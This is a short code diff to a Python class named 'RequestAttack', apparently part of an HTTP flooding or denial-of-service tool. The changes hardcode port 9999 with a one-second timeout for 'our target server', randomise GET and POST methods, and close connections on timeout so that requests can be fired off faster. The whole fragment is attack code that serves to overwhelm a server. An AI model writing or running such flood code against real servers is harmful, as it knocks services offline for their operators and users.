@@ -175,11 +175,13 @@ class RequestAttack():
 
 	def run(self):                                                          
 		try:	
-			connection = http.client.HTTPConnection(target)		
+			connection = http.client.HTTPConnection(target, port = 9999, timeout = 1)		### hardcoded port for our target server
 			url = self.create_url()
 			http_header = self.header()
-			method = 'GET' #method = choice(['get','post'])
+			method = choice(['GET','POST'])
 			connection.request(method, url, None, http_header)
+			connection.close()
+		except socket.timeout:
 			connection.close()
 		except KeyboardInterrupt:
 			sys.exit(print('Canceled by user'))
